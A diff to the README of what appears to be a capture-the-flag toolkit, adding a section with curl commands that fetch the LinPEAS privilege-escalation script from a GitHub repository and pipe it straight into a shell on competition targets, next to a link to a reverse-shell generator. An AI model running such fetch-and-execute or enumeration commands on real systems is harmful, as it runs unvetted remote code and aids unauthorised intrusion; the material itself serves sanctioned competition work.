@@ -14,6 +14,19 @@ Fast, reliable, AI-free cheat sheets, solver scripts, and payloads for the Grand
 
 ---
 
+## ⚡ 1-Second Tool Downloads for Competition Machines
+
+When you are on an organizer Linux machine or spawned target:
+
+```bash
+# Download & run LinPEAS directly from this repo:
+curl -sL https://raw.githubusercontent.com/klasyyi/ctf-tool/main/tools/linpeas.sh | sh
+# Or save to /tmp:
+curl -sL https://raw.githubusercontent.com/klasyyi/ctf-tool/main/tools/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh
+```
+
+---
+
 ## Emergency Survival Links (No AI Allowed)
 1. **[dcode.fr](https://www.dcode.fr/)** — Universal crypto / cipher solver
 2. **[revshells.com](https://www.revshells.com/)** — Instant reverse shell generator
